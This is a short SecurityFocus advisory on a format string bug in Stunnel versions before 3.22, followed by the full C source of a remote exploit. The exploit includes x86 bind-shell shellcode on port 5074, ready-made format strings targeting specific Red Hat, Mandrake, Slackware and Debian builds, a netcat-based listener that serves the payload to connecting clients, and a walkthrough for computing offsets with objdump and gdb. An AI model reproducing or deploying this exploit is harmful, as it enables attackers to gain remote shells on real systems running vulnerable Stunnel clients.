source: http://www.securityfocus.com/bid/3748/info

Stunnel is a freely available, open source cryptography wrapper. It is designed to wrap arbitrary protocols that may or may not support cryptography. It is maintained by the Stunnel project.

Stunnel does not properly handle unexpected input by users. When a protocol is initiated between a client and the server, it is possible to supply a format string to the Stunnel server that may result in the execution of arbitrary code. 

/*
 * Stunnel < 3.22 remote exploit
 * by ^sq/w00nf - deltha [at] analog.ro
 * Contact: deltha@analog.ro
 * Webpage: http://www.w00nf.org/^sq/
 *
 * ey ./w00nf-stunnel contribs - kewlthanx :
 * nesectio, wsxz, soletario, spacewalker, robin, luckyboy, hash, nobody, ac1d, and not @ the end: bajkero
 *
 * You also need netcat and format strings build utility (from my webpage)
 * Compile: gcc -w -o w00nf-stunnel w00nf-stunnel.c
 *
 *   .   .  .. ......................................... ...
 *  .                         ____  ____        _____        :.:.:
 *  :               _      __/ __ \/ __ \____  / __/           :..
 *  :..            | | /| / / / / / / / / __ \/ /_               :
 *  ..:..          | |/ |/ / /_/ / /_/ / / / / __/               :
 *  :.: :..        |__/|__/\____/\____/_/ /_/_/                  .
 *  : :   :..
 *  :.: :............................................... ..  .   . 
 *                           T . E . A . M      
 * 
 * POC - Tested remotely on linux 
 * Stunnel is a program that allows you to encrypt arbitrary TCP connections inside SSL 
 * Visit http://www.stunnel.org for details
 *
 * I didn't add a search function or bruteforce attack because the vulnerability does'nt allow you
 * to grab the remote stack.
 *
 * Description of this exploit:
 * This exploit puts a payload on a specified port. When a remote user connects to your machine 
 * using stunnel on the specified port, the exploit executes this payload and binds a shell to the
 * remote users machine on port 5074.
 * 
 * Summary: 
 * Malicious servers could potentially run code as the owner of an Stunnel process when using 
 * Stunnel's protocol negotiation feature in client mode. 
 *
 * Description of vulnerability: 
 * Stunnel is an SSL wrapper able to act as an SSL client or server, 
 * enabling non-SSL aware applications and servers to utilize SSL encryption. 
 * In addition, Stunnel has the ability to perform as simple SSL encryption/decryption 
 * engine. Stunnel can negotiate SSL with several other protocols, such as 
 * SMTP's "STARTTLS" option, using the '-n protocolname' flag. Doing so 
 * requires that Stunnel watches the initial protocol handshake before 
 * beginning the SSL session. 
 * There are format string bugs in each of the smtp, pop, and nntp 
 * client negotiations as supplied with Stunnel versions 3.3 up to 3.21c. 
 *
 * No exploit is currently known, but the bugs are most likely exploitable. 
 * 
 * Impact: 
 * If you use Stunnel with the '-n smtp', '-n pop', '-n nntp' options 
 * in client mode ('-c'), a malicous server could abuse the format 
 * string bug to run arbitrary code as the owner of the Stunnel 
 * process. The user that runs Stunnel depends on how you start 
 * Stunnel. It may or may not be root -- you will need to check 
 * how you invoke Stunnel to be sure. 
 * There is no vulnerability unless you are invoking Stunnel with 
 * the '-n smtp', '-n pop', or '-n nntp' options in client mode. 
 * There are no format string bugs in Stunnel when it is running as an SSL 
 * server. 
 *
 * Mitigating factors: 
 * If you start Stunnel as root but have it change userid to some other 
 * user using the '-s username' option, the Stunnel process will be 
 * running as 'username' instead of root when this bug is triggered. 
 * If this is the case, the attacker can still trick your Stunnel process 
 * into running code as 'username', but not as root. 
 * Where possible, we suggest running Stunnel as a non-root user, either 
 * using the '-s' option or starting it as a non-privileged user. 
 *
 * Triggering this vulnerability - example for kidz:
 * Obtain a shell account on to-be-hacked's server and perform the following commands:
 * sq@cal013102: whereis stunnel
 * stunnel: /usr/sbin/stunnel
 * change directory to where is stunnel
 * Obtain vsnprintf's R_386_JUMP_SLOT:
 * sq@cal013102:~/stunnel-3.20$ /usr/bin/objdump --dynamic-reloc ./stunnel |grep printf
 * 08053470 R_386_JUMP_SLOT   fprintf
 * ---->080534a8 R_386_JUMP_SLOT   vsnprintf
 * 080535a4 R_386_JUMP_SLOT   snprintf
 * 08053620 R_386_JUMP_SLOT   sprintf
 * open 2 terminals
 * in the first terminal make netcat connect to a port (eg 252525)
 * sq@cal013102:~/stunnel-3.20$ nc -p 252525 -l 
 * in the second terminal (remote) simulate attack 
 * ./stunnel -c -n smtp -r localhost:252525
 * in the first terminal with nc insert a specially crafted string to grep eatstack value
 * AAAABBBB%x|%x|%x|%x|%x|%x|%x|%x|%x|%x|%x|%x|%x|%x|%x|%x|
 * in the second terminal (remote) it will return the stack values and see at which position 
 * 41414141 and 424242 appeared
 * AAAABBBB|bffff868|bffffb60|bffffece|bffffed3|80503ae|40275580|4016bfc4|
 * 4027f3c4|41414141|42424242|257c7825|78257c78|7c78257c|
 * 257c7825|78257c78|7c78257c| ->414141=9 and 424242=10
 * try again with to see if eatstack value is 9 AAAABBBB%9$x%10$x and it will return AAAABBBB4141414142424242
 * put the address obtained with objdump in hex little endian format \xa8\x34\x05\x08 and last value +2 \xaa\x34\x05\x08
 * (a8+2=aa) and generate the decimal value of format string after you got the middle of nops value on stack 0xbffff89b
 * with build, a program attached to this exploit.
 * ./build 080534a8 0xbffff89b 9
 * adr : 134558888 (80534a8)
 * val : -1073743717 (bffff89b)
 * valh: 49151 (bfff)
 * vall: 63643 (f89b)
 * [??%.49143x%9$hn%.14492x%10$hn] (35)
 * ??%.49143x%9$hn%.14492x%10$hn
 * The resulting string is %.49143x%9$hn%.14492x%10$hn -> 
 * "'`%.32759u%9\$hn%.32197u%10\$hn replace eatstack 10 with 9 otherwise it won't work
 * eg "'`%.32759u%10\$hn%.32197u%9\$hn
 * Put the payload in a file echo `perl -e 'print "\xc4\x35\x05\x08\xc6\x35\x05\x08"'`%.32759u%10\$hn%.32197u%9\$hn > x
 * Bind the payload to a port ./netcat -p 252525 -l <x
 * Simulate the payload attack ./stunnel -c -n smtp -r localhost:252525
 * Add your own crafted format in the exploit:
 * char fmtDEBIAN30[]="\xa8\x34\x05\x08\xaa\x34\x05\x08%.49143x%10\$hn%.14492x%9\$hn"; 080534a8 vsnprintf
 * char fmtYOUROWN[]="";   R_386_JUMP_SLOT  vsnprintf 
 * Simulate the payload attack with this exploit ./w00nf-stunnel -t 6 -p 252525 t6 would be your custom payload
 * after you added your string in the exploit.
 * If stunnel was compiled with gdb support and you set ulimit -c 9024 or whatever to coredump on your terminal
 * then stunnel will coredump if you didn't guess the exact stackvalue in the middle of nops.
 * If stunnel wasn't compiled with gdb support then download it from the stunnel website
 * and compile with gdb support. 
 * Once you have downloaded it run './configure edit Makefile' , and where you see 'CFLAGS' add '-g -ggdb3'
 * eg. 'cat Makefile |grep CFLAGS'
 * CFLAGS=-g -ggdb3 -O2 -Wall -I/usr/local/ssl/include  -DVERSION=\"3.20\" -DHAVE_OPENSSL=1 -Dssldir=\"/usr/local/ssl\"
 * -DPEM_DIR=\"\" -DRANDOM_FILE=\"/dev/urandom\" -DSSLLIB_CS=0 -DHOST=\"i586-pc-linux-gnu\" -DHAVE_LIBDL=1  
 * DHAVE_LIBPTHREAD=1 -DHAVE_LIBUTIL=1 -DHAVE_LIBWRAP=1 etcetc
 * Open core in gdb sq@cal013102:~/stunnel-3.20$gdb ./stunnel core.2411
 * x/10i $esp and press enter a couple of times till you find 'nop nop nop nop nop nop'.
 * Get the stack address in the middle of nops, 0xbffff89b is my address
 * and build (9 is eatstack) again with the ./build utility
 * Rebuild and repeat.
 * ./build 080534a8 0xbffff89b 9
 * Put the payload in a file echo `perl -e 'print "\xc4\x35\x05\x08\xc6\x35\x05\x08"'`%.32759u%10\$hn%.32197u%9\$hn > x
 * ./w00nf-stunnel -t 6 -p 252525 t6 is your custom payload and it will bind a shell on 5074 :)
 * If it worked then add your own crafted format in the exploit
 * char fmtDEBIAN30[]="\xa8\x34\x05\x08\xaa\x34\x05\x08%.49143x%10\$hn%.14492x%9\$hn";  080534a8 vsnprintf
 * char fmtYOUROWN[]="\xa8\x34\x05\x08\xaa\x34\x05\x08%.49143x%10\$hn%.14492x%9\$hn";   R_386_JUMP_SLOT  vsnprintf 
 *
 */

#include <fcntl.h>
#include <netdb.h>
#include <sys/stat.h>
#include <sys/types.h>
#include <unistd.h>
#include <stdio.h>
#include <string.h>
#include <getopt.h>
#include <stdlib.h>
#include <memory.h>
#include <errno.h>
#include <syslog.h>

int MAX;
char linuxshellcode[] =
                                        /*   <priv8security>: bind@5074 */
	"\x90\x90\x90\x90\x90"          /*   nop	                */
	"\x90\x90\x90\x90\x90"          /*   nop		        */
	"\x90\x90\x90\x90\x90"          /*   nop	                */
	"\x90\x90\x90\x90\x90"          /*   nop	                */
	"\x90\x90\x90\x90\x90"          /*   nop	                */
	"\x90\x90\x90\x90\x90"          /*   nop	                */
	"\x90\x90\x90\x90\x90"          /*   nop	                */
	"\x90\x90\x90\x90\x90"          /*   nop	                */
	"\x90\x90\x90\x90\x90"          /*   nop	                */
	"\x90\x90\x90\x90\x90"          /*   nop	                */
	"\x90\x90\x90\x90\x90"          /*   nop	                */
	"\x90\x90\x90\x90\x90"          /*   nop	                */
	"\x90\x90\x90\x90\x90"          /*   nop	                */
	"\x90\x90\x90\x90\x90"          /*   nop	                */
	"\x90\x90\x90\x90\x90\x90"     	/*   nop	                */
        "\x31\xc0"                      /*   xor    %eax,%eax           */
        "\x50"                          /*   push   %eax                */
        "\x40"                          /*   inc    %eax                */
        "\x89\xc3"                      /*   mov    %eax,%ebx           */
        "\x50"                          /*   push   %eax                */
        "\x40"                          /*   inc    %eax                */
        "\x50"                          /*   push   %eax                */
        "\x89\xe1"                      /*   mov    %esp,%ecx           */
        "\xb0\x66"                      /*   mov    $0x66,%al           */
        "\xcd\x80"                      /*   int    $0x80               */
        "\x31\xd2"                      /*   xor    %edx,%edx           */
        "\x52"                          /*   push   %edx                */
        "\x66\x68\x13\xd2"              /*   pushw  $0xd213             */
        "\x43"                          /*   inc    %ebx                */
        "\x66\x53"                      /*   push   %bx                 */
        "\x89\xe1"                      /*   mov    %esp,%ecx           */
        "\x6a\x10"                      /*   push   $0x10               */
        "\x51"                          /*   push   %ecx                */
        "\x50"                          /*   push   %eax                */
        "\x89\xe1"                      /*   mov    %esp,%ecx           */
        "\xb0\x66"                      /*   mov    $0x66,%al           */
        "\xcd\x80"                      /*   int    $0x80               */
        "\x40"                          /*   inc    %eax                */
        "\x89\x44\x24\x04"              /*   mov    %eax,0x4(%esp,1)    */
        "\x43"                          /*   inc    %ebx                */
        "\x43"                          /*   inc    %ebx                */
        "\xb0\x66"                      /*   mov    $0x66,%al           */
        "\xcd\x80"                      /*   int    $0x80               */
        "\x83\xc4\x0c"                  /*   add    $0xc,%esp           */
        "\x52"                          /*   push   %edx                */
        "\x52"                          /*   push   %edx                */
        "\x43"                          /*   inc    %ebx                */
        "\xb0\x66"                      /*   mov    $0x66,%al           */
        "\xcd\x80"                      /*   int    $0x80               */
        "\x93"                          /*   xchg   %eax,%ebx           */
        "\x89\xd1"                      /*   mov    %edx,%ecx           */
        "\xb0\x3f"                      /*   mov    $0x3f,%al           */
        "\xcd\x80"                      /*   int    $0x80               */
        "\x41"                          /*   inc    %ecx                */
        "\x80\xf9\x03"                  /*   cmp    $0x3,%cl            */
        "\x75\xf6"                      /*   jne    80a035d <priv8security+0x3d>        */
        "\x52"                          /*   push   %edx                */
        "\x68\x6e\x2f\x73\x68"          /*   push   $0x68732f6e         */
        "\x68\x2f\x2f\x62\x69"          /*   push   $0x69622f2f         */
        "\x89\xe3"                      /*   mov    %esp,%ebx           */
        "\x52"                          /*   push   %edx                */
        "\x53"                          /*   push   %ebx                */
        "\x89\xe1"                      /*   mov    %esp,%ecx           */
        "\xb0\x0b"                      /*   mov    $0xb,%al            */
        "\xcd\x80";                     /*   int    $0x80               */

char fmtRH72[]="\x50\x71\x05\x08\x52\x71\x05\x08%.49143x%4\$hn%.12881x%3\$hn"; /* 08057150 R_386_JUMP_SLOT   vsnprintf */
char fmtRH73[]="\xe8\x69\x05\x08\xea\x69\x05\x08%.49143x%4\$hn%.12982x%3\$hn"; /* 080569e8 R_386_JUMP_SLOT   vsnprintf */
char fmtRH80[]="\x28\x69\x05\x08\x2a\x69\x05\x08%.49143x%4\$hn%.12815x%3\$hn"; /* 08056928 R_386_JUMP_SLOT   vsprintf */
char fmtMDK90[]="\xf8\x23\x05\x08\xfa\x23\x05\x08%.49143x%4\$hn%.13321x%3\$hn"; /* 080523f8 R_386_JUMP_SLOT   vsnprintf */
char fmtSLACK81[]="\xdc\x69\x05\x08\xde\x69\x05\x08%.49143x%10\$hn%.12082x%9\$hn"; /* 080569dc R_386_JUMP_SLOT  vsnprintf */
char fmtDEBIAN30[]="\xa8\x34\x05\x08\xaa\x34\x05\x08%.49143x%10\$hn%.14492x%9\$hn"; /* 080534a8 R_386_JUMP_SLOT  vsnprintf */
char fmtYOUROWN[]=""; /*  R_386_JUMP_SLOT  vsnprintf */
        
char    c;
struct  os {
    int num;
    char *ost;
    char *shellcode;
    char *format;
    int flag;
};
 
struct os plat[] =
{
    {
        0,"Red Hat Linux release 7.2 stunnel-3.20.tar.gz",
        linuxshellcode,fmtRH72,11
    },
    {
        1,"Red Hat Linux release 7.3 stunnel-3.20.tar.gz",
        linuxshellcode,fmtRH73,11
    },
    {
        2,"Red Hat Linux release 8.0 stunnel-3.20.tar.gz",
        linuxshellcode,fmtRH80,11
    },
    {
        3,"Mandrake Linux release 9.0 stunnel-3.20.tar.gz",
        linuxshellcode,fmtMDK90,11
    },
    {
        4,"Slackware Linux release 8.1 stunnel-3.20.tar.gz",
        linuxshellcode,fmtSLACK81,5
    },
    {
        5,"Debian GNU release 3.0 stunnel-3.20.tar.bz2",
        linuxshellcode,fmtDEBIAN30,5
    },
    {
        6,"Your custom distro stunnel-3.20.tar.bz2",
        linuxshellcode,fmtYOUROWN,5
    }
    
};

void usage(char *argument);
int main(argc,argv)
    int argc;
    char *argv[];
{

int type=0;
int flag=plat[type].flag;
extern char *optarg;
int cnt;
char    newstring[300];
int     port = 994;
const char* sploitdata_filename = "sploitdata.spl";     
static        int fd[2];
static        pid_t childpid;
static        char str_port[6];

void write_sploit_data (char* entry)
    {
    int fd = open (sploitdata_filename, O_WRONLY | O_CREAT | O_APPEND, 0660);
    write (fd, entry, strlen (entry));
    write (fd, "\n", 1);
    fsync (fd);
    close (fd);
    }
      if(argc == 1) 
                    usage(argv[0]);
      if(argc == 2) 
                    usage(argv[0]);
      if(argc == 3) 
                    usage(argv[0]);
        while ((c = getopt(argc, argv, "h:p:t:v")) > 0 ){
                switch (c) {
                case 't':
                        type = atoi(optarg);
                        if(type>6) /* 0,1,2,3,4,5,6 */
                        {
                        (void)usage(argv[0]);
                        }
                        break;
                case 'p':
                        port = atoi(optarg);
                        break;
                case 'h':
                        usage(argv[0]);
                case '?':
                case ':':
                        exit(-1);
                }
        }
        MAX=strlen(plat[type].format)+strlen(plat[type].shellcode);
        fprintf(stdout,"Remote exploit for STUNNEL <3.22\nby ^sq/w00nf - deltha [at] analog.ro\n");
        fprintf(stdout,"[*] target: %s\n",plat[type].ost);
        fprintf(stdout,"[*] maxlenght: %d\n", MAX);
        unlink (sploitdata_filename);
        strcpy(newstring, plat[type].format);
        strcat(newstring, plat[type].shellcode);
        write_sploit_data(newstring);
        sprintf((char *) &str_port, "%d", port);
        printf("[*] host: localhost\n");
        printf("[*] port: %s\n", str_port);             
        printf("[*] waiting: jackass should connect to our port\n");
        printf("[*] next: after he connects press ctrl-c\n");       
        printf("[*] next: you should try to connect to his port 5074 - nc 1.2.3.4 5074\n");               
        pipe(fd);
        if (( childpid=fork())==0) { /* cat is the child */
                dup2(fd[1],STDOUT_FILENO);
                close(fd[0]);
                close(fd[1]);
                execl("/bin/cat","cat",sploitdata_filename,NULL);
                perror("The exec of cat failed");
        } else {                      /* netcat is the parent */

                dup2(fd[0], STDIN_FILENO);
                close(fd[0]);
                close(fd[1]);
                execl("/usr/bin/nc", "nc", "-n", "-l", "-p", str_port, NULL);
                perror("the exec of nc failed");
        }
        printf("[*] next: now you should try to connect to his port 5074\n");               
        exit(0);
}

void usage(char *argument)
{
	fprintf(stdout,"Usage: %s -options arguments\n",argument);
	fprintf(stdout,"Remote exploit for STUNNEL <3.22\n"
	"by ^sq/w00nf - deltha [at] analog.ro\nUsage: %s [-p <port> -t <targettype>]\n"
	"\t-p <port> - Local binded port where the remote stunnel connects\n"
	"\t-t <target> - Target type number\n", argument);
        fprintf(stdout,"\t-Target Type Number List-\n");
    fprintf(stdout," {0} Red Hat Linux release 7.2 "
	    " stunnel-3.20.tar.gz\n");
    fprintf(stdout," {1} Red Hat Linux release 7.3 "
	    " stunnel-3.20.tar.gz\n");
    fprintf(stdout," {2} Red Hat Linux release 8.0 "
	    " stunnel-3.20.tar.gz\n");
    fprintf(stdout," {3} Mandrake Linux release 9.0 "
	    " stunnel-3.20.tar.gz\n");
    fprintf(stdout," {4} Slackware Linux release 8.1 "
	    " stunnel-3.20.tar.gz\n");
    fprintf(stdout," {5} Debian GNU release 3.0 "
	    " stunnel-3.20.tar.gz\n");
    fprintf(stdout," {6} Your custom distro "
	    " stunnel-3.20.tar.gz\n");
    fprintf(stdout," Example1: %s -t 1 -p 252525\n",argument);
	exit(0);
}